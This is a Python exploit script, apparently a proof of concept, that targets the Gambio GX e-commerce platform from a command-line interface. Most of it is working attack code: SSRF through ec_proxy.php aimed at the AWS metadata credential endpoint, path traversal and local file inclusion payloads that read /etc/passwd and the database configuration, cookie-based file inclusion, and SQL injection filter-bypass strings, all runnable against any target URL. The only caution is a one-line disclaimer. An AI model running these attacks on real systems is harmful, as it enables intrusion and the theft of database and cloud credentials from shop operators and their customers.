#!/usr/bin/env python3
"""
Gambio GX Security PoC - GET Parameter Exploits with basename() Bypass
=======================================================================

This script demonstrates exploitation techniques for vulnerabilities that
use GET parameters and can be exploited via path traversal bypasses.

Target: Gambio GX eCommerce Platform
Vulnerabilities: LFI, SSRF, Path Traversal with basename() bypass

DISCLAIMER: For authorized security testing only!
"""

import requests
import argparse
import sys
import urllib.parse
from typing import Optional, List, Tuple

class GambioExploit:
    """Gambio GX Exploit Framework"""
    
    def __init__(self, target: str, verify_ssl: bool = False):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    # =========================================================================
    # SSRF via ec_proxy.php (NO AUTH REQUIRED)
    # =========================================================================
    def ssrf_ec_proxy(self, internal_url: str) -> Tuple[bool, str]:
        """
        SSRF via ec_proxy.php - No authentication required
        
        Vulnerable code:
            $url = $_GET['url'];
            $response = file_get_contents($url);
        """
        endpoint = f"{self.target}/ec_proxy.php"
        params = {'url': internal_url}
        
        try:
            resp = self.session.get(endpoint, params=params, timeout=10)
            if resp.status_code == 200 and len(resp.text) > 0:
                return True, resp.text
            return False, f"Status: {resp.status_code}"
        except Exception as e:
            return False, str(e)
    
    # =========================================================================
    # SSRF via autocomplete.php (NO AUTH REQUIRED)
    # =========================================================================
    def ssrf_autocomplete(self, internal_url: str) -> Tuple[bool, str]:
        """
        SSRF via autocomplete.php - No authentication required
        """
        endpoint = f"{self.target}/autocomplete.php"
        params = {'url': internal_url}
        
        try:
            resp = self.session.get(endpoint, params=params, timeout=10)
            return resp.status_code == 200, resp.text
        except Exception as e:
            return False, str(e)
    
    # =========================================================================
    # Path Traversal with basename() bypass
    # =========================================================================
    def path_traversal_basename_bypass(self, target_file: str = '/etc/passwd') -> Tuple[bool, str]:
        """
        Path traversal with basename() bypass techniques.
        
        basename() in PHP only considers the last path component:
        - basename('../../etc/passwd') = 'passwd'
        - basename('....//....//etc/passwd') = 'passwd'
        
        But some implementations can be bypassed using:
        - Null byte injection (PHP < 5.3.4): ../../etc/passwd%00.jpg
        - Double encoding: %252e%252e%252f
        - Unicode encoding: ..%c0%af
        """
        payloads = [
            # Standard traversal
            f"../../..{target_file}",
            f"....//....//..../{target_file}",
            
            # Double encoding
            f"%252e%252e%252f%252e%252e%252f%252e%252e{target_file}",
            
            # Mixed encoding
            f"..%2f..%2f..{target_file}",
            
            # Backslash variants (Windows)
            f"..\\..\\..{target_file}",
            
            # Null byte (legacy PHP)
            f"../../..{target_file}%00.jpg",
            f"../../..{target_file}\x00.jpg",
        ]
        
        results = []
        for payload in payloads:
            # Try via different GET parameters commonly used
            for param in ['file', 'path', 'template', 'language', 'include', 'page']:
                endpoint = f"{self.target}/index.php"
                params = {param: payload}
                
                try:
                    resp = self.session.get(endpoint, params=params, timeout=5)
                    # Check for /etc/passwd content indicators
                    if 'root:' in resp.text or 'daemon:' in resp.text:
                        results.append((param, payload, resp.text[:500]))
                except:
                    pass
        
        if results:
            return True, str(results)
        return False, "No successful path traversal found"
    
    # =========================================================================
    # LFI via language/template parameters
    # =========================================================================
    def lfi_language_param(self, target_file: str = '../../config/database') -> Tuple[bool, str]:
        """
        LFI via language or template GET parameters
        
        Vulnerable pattern:
            $language = basename($_GET['language']);  // Can be bypassed!
            include('lang/' . $language . '.php');
        
        Bypass basename() with:
            language=../../config/database  (basename returns 'database')
            
        But if full path is used before basename:
            include($_GET['language']);  // Direct LFI
        """
        endpoints = [
            # Cloudloader endpoints
            ("/ext/mailhive/cloudbeez/cloudloader_core.php", "language"),
            ("/ext/mailhive/cloudbeez/cloudloader_packages.php", "language"),
            
            # Generic includes
            ("/index.php", "language"),
            ("/index.php", "template"),
            ("/shop.php", "language"),
        ]
        
        payloads = [
            target_file,
            f"{target_file}.php",
            f"../../..{target_file}",
            f"....//..../{target_file}",
        ]
        
        for endpoint, param in endpoints:
            for payload in payloads:
                url = f"{self.target}{endpoint}"
                params = {param: payload}
                
                try:
                    resp = self.session.get(url, params=params, timeout=5)
                    # Check for database config indicators
                    if any(x in resp.text for x in ['DB_SERVER', 'DB_DATABASE', 'mysql', 'password']):
                        return True, f"LFI successful!\nEndpoint: {endpoint}\nParam: {param}\nPayload: {payload}\n\nResponse:\n{resp.text[:1000]}"
                except:
                    pass
        
        return False, "No LFI vulnerability found with these payloads"
    
    # =========================================================================
    # Cookie-based LFI (Session manipulation)
    # =========================================================================
    def lfi_cookie_based(self, target_file: str = '../../config/database') -> Tuple[bool, str]:
        """
        LFI via Cookie parameters (language session variable)
        
        Vulnerable pattern:
            $language = $_SESSION['language'] ?? $_COOKIE['language'];
            include('lang/' . $language . '.php');
        """
        endpoints = [
            "/ext/mailhive/cloudbeez/cloudloader_core.php",
            "/ext/mailhive/cloudbeez/cloudloader_packages.php",
            "/index.php",
        ]
        
        payloads = [
            target_file,
            f"../../config/database",
            f"....//....//config/database",
        ]
        
        for endpoint in endpoints:
            for payload in payloads:
                url = f"{self.target}{endpoint}"
                
                # Set malicious cookie
                cookies = {
                    'language': payload,
                    'PHPSESSID': 'malicious_session_id'
                }
                
                try:
                    resp = self.session.get(url, cookies=cookies, timeout=5)
                    if any(x in resp.text for x in ['DB_SERVER', 'define', 'password']):
                        return True, f"Cookie-based LFI successful!\nEndpoint: {endpoint}\nPayload: {payload}\n\nResponse:\n{resp.text[:1000]}"
                except:
                    pass
        
        return False, "No cookie-based LFI found"
    
    # =========================================================================
    # SQL Injection Filter Bypass via GET
    # =========================================================================
    def sqli_filter_bypass(self, param: str = 'id') -> Tuple[bool, str]:
        """
        SQL Injection with filter bypass
        
        Filter in xtc_db_prepare_input.inc.php:
            preg_replace('/union.*select.*from/i', '', $string);
        
        Bypass techniques:
            un/**/ion sel/**/ect fr/**/om
            /*!50000union*//*!50000select*//*!50000from*/
        """
        payloads = [
            # Comment bypass
            f"1 un/**/ion sel/**/ect 1,2,3,4,5 fr/**/om users--",
            
            # Version-specific MySQL comments
            f"1 /*!50000union*/ /*!50000select*/ 1,2,3,4,5 /*!50000from*/ users--",
            
            # Case mixing with encoding
            f"1 UnIoN%20SeLeCt%201,2,3,4,5%20FrOm%20users--",
            
            # Double URL encoding
            f"1%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%201,2,3,4,5%20%66%72%6f%6d%20users--",
            
            # Whitespace alternatives
            f"1\tunion\tselect\t1,2,3,4,5\tfrom\tusers--",
            f"1%0aunion%0aselect%0a1,2,3,4,5%0afrom%0ausers--",
        ]
        
        # Common endpoints that might use GET params in SQL
        endpoints = [
            "/index.php",
            "/product_info.php", 
            "/products_new.php",
            "/specials.php",
        ]
        
        results = []
        for endpoint in endpoints:
            for payload in payloads:
                url = f"{self.target}{endpoint}"
                params = {param: payload}
                
                try:
                    resp = self.session.get(url, params=params, timeout=5)
                    # Check for SQL error messages or data leakage
                    error_indicators = [
                        'mysql', 'syntax', 'query', 'SELECT', 'FROM',
                        'Warning:', 'Error:', 'SQL'
                    ]
                    if any(x.lower() in resp.text.lower() for x in error_indicators):
                        results.append({
                            'endpoint': endpoint,
                            'param': param,
                            'payload': payload,
                            'response_snippet': resp.text[:500]
                        })
                except:
                    pass
        
        if results:
            return True, f"Potential SQLi found:\n{results}"
        return False, "No SQLi indicators found"
    
    # =========================================================================
    # AWS Metadata SSRF
    # =========================================================================
    def ssrf_aws_metadata(self) -> Tuple[bool, str]:
        """
        SSRF to AWS metadata endpoint - Cloud credential theft
        """
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
        ]
        
        results = []
        for meta_url in metadata_urls:
            success, response = self.ssrf_ec_proxy(meta_url)
            if success and 'ami-id' in response.lower() or 'instance' in response.lower():
                results.append({
                    'url': meta_url,
                    'response': response[:500]
                })
        
        if results:
            return True, f"AWS Metadata accessible via SSRF:\n{results}"
        return False, "AWS metadata not accessible"
    
    # =========================================================================
    # Information Disclosure via GET
    # =========================================================================
    def info_disclosure_phpinfo(self) -> Tuple[bool, str]:
        """
        phpinfo() disclosure - No authentication required
        """
        endpoints = [
            "/magnalister_compatibility_check.php",
            "/info.php",
            "/phpinfo.php",
            "/test.php",
        ]
        
        for endpoint in endpoints:
            url = f"{self.target}{endpoint}"
            try:
                resp = self.session.get(url, timeout=5)
                if 'phpinfo()' in resp.text or 'PHP Version' in resp.text:
                    return True, f"phpinfo() found at: {endpoint}\n\nSnippet:\n{resp.text[:1000]}"
            except:
                pass
        
        return False, "No phpinfo() disclosure found"
    
    # =========================================================================
    # Run all GET-based exploits
    # =========================================================================
    def run_all_get_exploits(self) -> dict:
        """Run all GET parameter based exploits"""
        results = {}
        
        print("[*] Running GET parameter exploits...")
        
        print("[*] Testing SSRF via ec_proxy.php...")
        results['ssrf_ec_proxy'] = self.ssrf_ec_proxy("http://169.254.169.254/latest/meta-data/")
        
        print("[*] Testing SSRF via autocomplete.php...")
        results['ssrf_autocomplete'] = self.ssrf_autocomplete("http://127.0.0.1/")
        
        print("[*] Testing Path Traversal with basename bypass...")
        results['path_traversal'] = self.path_traversal_basename_bypass()
        
        print("[*] Testing LFI via language param...")
        results['lfi_language'] = self.lfi_language_param()
        
        print("[*] Testing Cookie-based LFI...")
        results['lfi_cookie'] = self.lfi_cookie_based()
        
        print("[*] Testing SQL Injection filter bypass...")
        results['sqli_bypass'] = self.sqli_filter_bypass()
        
        print("[*] Testing AWS Metadata SSRF...")
        results['aws_metadata'] = self.ssrf_aws_metadata()
        
        print("[*] Testing phpinfo() disclosure...")
        results['phpinfo'] = self.info_disclosure_phpinfo()
        
        return results


def main():
    parser = argparse.ArgumentParser(
        description='Gambio GX Security PoC - GET Parameter Exploits',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run all GET exploits
  python3 poc_get_basename.py https://target.com --all
  
  # SSRF via ec_proxy.php
  python3 poc_get_basename.py https://target.com --ssrf http://169.254.169.254/
  
  # Path traversal with basename bypass
  python3 poc_get_basename.py https://target.com --lfi /etc/passwd
  
  # SQL Injection filter bypass
  python3 poc_get_basename.py https://target.com --sqli products_id
        """
    )
    
    parser.add_argument('target', help='Target URL (e.g., https://shop.example.com)')
    parser.add_argument('--all', action='store_true', help='Run all exploits')
    parser.add_argument('--ssrf', metavar='URL', help='SSRF via ec_proxy.php')
    parser.add_argument('--lfi', metavar='FILE', help='LFI via path traversal')
    parser.add_argument('--sqli', metavar='PARAM', help='SQL Injection test on parameter')
    parser.add_argument('--cookie-lfi', metavar='FILE', help='Cookie-based LFI')
    parser.add_argument('--phpinfo', action='store_true', help='Check for phpinfo() disclosure')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL verification')
    
    args = parser.parse_args()
    
    exploit = GambioExploit(args.target, verify_ssl=not args.no_ssl_verify)
    
    if args.all:
        results = exploit.run_all_get_exploits()
        print("\n" + "="*60)
        print("RESULTS SUMMARY")
        print("="*60)
        for name, (success, data) in results.items():
            status = "✓ VULNERABLE" if success else "✗ Not vulnerable"
            print(f"\n[{status}] {name}")
            if success:
                print(f"    {data[:200]}...")
    
    elif args.ssrf:
        success, data = exploit.ssrf_ec_proxy(args.ssrf)
        print(f"[{'✓' if success else '✗'}] SSRF Result:")
        print(data)
    
    elif args.lfi:
        success, data = exploit.path_traversal_basename_bypass(args.lfi)
        print(f"[{'✓' if success else '✗'}] LFI Result:")
        print(data)
    
    elif args.sqli:
        success, data = exploit.sqli_filter_bypass(args.sqli)
        print(f"[{'✓' if success else '✗'}] SQLi Result:")
        print(data)
    
    elif args.cookie_lfi:
        success, data = exploit.lfi_cookie_based(args.cookie_lfi)
        print(f"[{'✓' if success else '✗'}] Cookie LFI Result:")
        print(data)
    
    elif args.phpinfo:
        success, data = exploit.info_disclosure_phpinfo()
        print(f"[{'✓' if success else '✗'}] phpinfo() Result:")
        print(data)
    
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
